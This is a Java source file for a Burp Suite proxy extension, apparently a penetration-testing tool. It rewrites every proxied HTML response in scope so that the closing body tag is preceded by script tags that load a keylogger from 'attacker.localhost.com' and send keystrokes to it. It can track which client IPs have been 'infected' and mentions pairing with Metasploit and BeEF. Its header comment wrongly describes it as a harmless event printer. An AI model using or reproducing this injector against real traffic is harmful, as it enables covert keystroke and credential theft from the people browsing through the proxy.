package burp;

import java.util.ArrayList;
import java.util.List;

/**
 * This extension registers listeners for various runtime events, and prints a message when each event occurs.
 * @author cmcneill
 * 
 * 
 * Configuration
 * ==============
 * 
 * 	mimeType				-	Desired MIME type to target
 * 
 *  infectOnlyInScope 		- 	Infect only pages matching the scope defined in Burp 
 *  
 *  duplicates				-	Manage infection duplicates
 *  								EVERY: do not manage duplicates / infect every page (if MIME type and scope are OK)
 *  								BY_IP: one infection by source IP address / useful when deploying client-side attacks (Metasploit, img on a SMB)
 *  								BY_IP_AND_SERVICE: one infection by source IP address and service / useful when using BeEF
 *  								BY_IP_AND_URL: one infection by source IP address and URL (including GET parameters) / useful when injecting FireBug Lite
 * 	
 * marker					- 	Value in response that should be changed
 * 
 * code						- 	Value in response that should be inserted in place of marker
 * 
 */
public class BurpExtender implements IBurpExtender, IProxyListener{
	
	private String mimeType = "HTML";
	private DuplicateType duplicates = DuplicateType.EVERY;
	private boolean infectOnlyInScope = false;
	private final String marker = "</body>";
	private final String code = "<script type='text/javascript' "
								+ "src='http://attacker.localhost.com/js/keylogger.js'>"
								+ "</script>"
								+ "<script type='text/javascript'>"
									+ "destination='http://attacker.localhost.com/Keylogger/?k=';"
								+ "</script>" + this.marker;
	
    /*
	* ====================================
	* =   Do not modify below this line  =
	* ====================================
    */
	private Logger logger;
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;
	private boolean verbose = true;
	private List<String> infectedHosts = new ArrayList<String>();
	private enum DuplicateType {
		EVERY,
		BY_IP,
		BY_IP_AND_SERVICE,
		BY_IP_AND_URL
	}
	
	
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) 
	{
		this.logger = new Logger(callbacks);
		this.callbacks = callbacks;
		this.helpers = callbacks.getHelpers();
		
        callbacks.setExtensionName("Replace response content with alternative data");
        callbacks.registerProxyListener(this);
	}

	public void processProxyMessage(final boolean isRequest, final IInterceptedProxyMessage message) 
	{
		
		if (isRequest)
			return;
		
		String clientIp = message.getClientIpAddress().getHostAddress();
		int messageRef = message.getMessageReference();

		byte[] response = message.getMessageInfo().getResponse();
		IResponseInfo parsedResponse = helpers.analyzeResponse(response);

		IHttpRequestResponse request = message.getMessageInfo();
		IRequestInfo parsedRequest = helpers.analyzeRequest(request);
		
		// if needed, do not process out of scope messages
		if (messageInScope(parsedRequest)) {
			if (verbose)
				logger.info("[-] #%d (%s) Response was NOT infected (not in scope)", messageRef, clientIp);

			return;
		}
		
		if (!messageIsTargetedMime(parsedResponse)) {
			if (verbose)
				logger.info("[!] #%d (%s) Response was NOT infected (MIME type != '%s') ", messageRef,  clientIp, mimeType);

			return;
		}

		String sig = "";
		switch (duplicates) {
			case EVERY: // infect every request
				break;
			case BY_IP:
				sig = clientIp;
				break;
			case BY_IP_AND_SERVICE:
				IHttpService service = message.getMessageInfo().getHttpService();
				sig = clientIp + "||" + service.getProtocol() + "://" + service.getHost() + ":" + service.getPort();
			break;
			case BY_IP_AND_URL:
				sig = clientIp + "||" + parsedRequest.getUrl();
			break;
			default:
				throw new RuntimeException("Invalid valid for duplicates supplied");
		}
		
		if ( !duplicates.equals(DuplicateType.EVERY)  && ( infectedHosts.contains(sig) ) ){
			if (verbose)
				logger.info("[-] #%d (%s) Response was NOT infected (already infected)", messageRef, clientIp );
			
			return;
		}
		
		// extract the body and headers
		List<String> headers = parsedResponse.getHeaders();
		String body = helpers.bytesToString(response).substring(parsedResponse.getBodyOffset());
		
		// infect only if the marker is found in the body
		if (!body.contains(marker)){
			if (verbose)
				logger.info("[-] #%d (%s) Response was NOT infected (no marker in body)", messageRef, clientIp );

			return;
		}
		
		// update the response (will also update the Content-Length header)
		message.getMessageInfo().setResponse(getUpdatedResponse(headers, body));
		
		infectedHosts.add(sig);
		logger.info("[+] #%d (%s) Response was infected! %s", messageRef, clientIp, parsedRequest.getUrl());
		
		// tag the message in Proxy / History
		message.getMessageInfo().setComment(String.format("Source '%s' was infected!", clientIp));
		message.getMessageInfo().setHighlight("yellow");
		
	}

	private byte[] getUpdatedResponse(List<String> messageHeaders, String messageBody) {
		return helpers.buildHttpMessage(
				messageHeaders, 
				helpers.stringToBytes(
						messageBody.replace(marker, code)));
	}

	private boolean messageInScope(IRequestInfo parsedRequest) {
		return infectOnlyInScope && !callbacks.isInScope(parsedRequest.getUrl());
	}

	private boolean messageIsTargetedMime(IResponseInfo parsedResponse) {
		return parsedResponse.getInferredMimeType().equalsIgnoreCase(mimeType);
	}
	
}